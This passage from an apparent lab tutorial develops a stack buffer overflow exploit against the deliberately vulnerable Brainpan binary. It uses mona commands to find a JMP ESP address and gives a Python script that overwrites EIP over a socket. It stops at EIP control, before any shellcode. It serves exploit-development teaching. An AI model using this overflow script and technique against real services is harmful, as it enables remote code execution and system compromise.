# Finding the right module

We are going to check for ``dll`` or something comparable in the ``brainpan.exe`` that does not have memory protection settings. Again, ``mona`` can help to find the right module Using the following command, we can list all the module in ``brainpan.exe``

```cli
!module modules
```

![alt Right module](../images/brainpan21.png  "Finding right module using mona")

As we can see in the screenshot above, all the ``dll`` have memory protect. ``brainpan.exe`` does not have the memory protection, thus it is our right module. Next, we should find an opcode equivalent of a ``JMP ESP``. To do that, we need to use the ``Metasploit`` module.

![alt  Jmp esp opcode](../images/brainpan22.png  "Get JMP ESP opcode using mona")

From the screenshot above, we can see the opcode is ``FFE4``. We need to find memory address  with ``FFE4`` (JMP ESP) opcode in ``brainpan.exe`` using ``mona``. We can use the following command in ``mona``:

```cli
!mona find -s "\xff\xe4" -m brainpan.exe
```

![alt Get memory address](../images/brainpan23.png  "Get memory address with JMP ESP opcode")

As we can see on the screenshot above, we can see the memory address with ``JMP ESP`` opcode is ``311712F3``. Now we need to be able to control the ``EIP``. We need to put a breakpoint on ``311712F3`` address in ``Immunity Debugger``, overflow the buffer and place ``311712F3`` in ``EIP`` to see if our breakpoint will be hit. Now, we can modify our python script and add the return address that we noted in the reverse order ("\xf3\x12\x17\x31"). I created another script called [brainpan_jmp_esp.py](https://github.com/cris-m/buffer_overflow_exploit_development/blob/main/assets/resources/brainpan_jmp_esp.py)

```python
#!/usr/bin/python3
import sys
import socket
from time import sleep

# our JMP ESP address is at  0x311712f3

buffer = b"A" * 510 + b"\xf3\x12\x17\x31"

while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('192.168.10.4', 9999))
        payload = b'shitstorm /.:/' + buffer
        sock.send(payload)
        sock.close()
    except:
        print("Error connecting to the server")
        sys.exit()
```

``Immunity Debugger`` hits directly our breakpoint after running the above script and pause the execution since we have an access violation error notification.

![alt Hit the breakpoint](../images/brainpan24.png  "Hit the breakpoint in immunity debugger")

As we can see in the screenshot, we hit our breakpoint, means that we have full control over the ``EIP`` and can run any shell code to compromise our target machine.
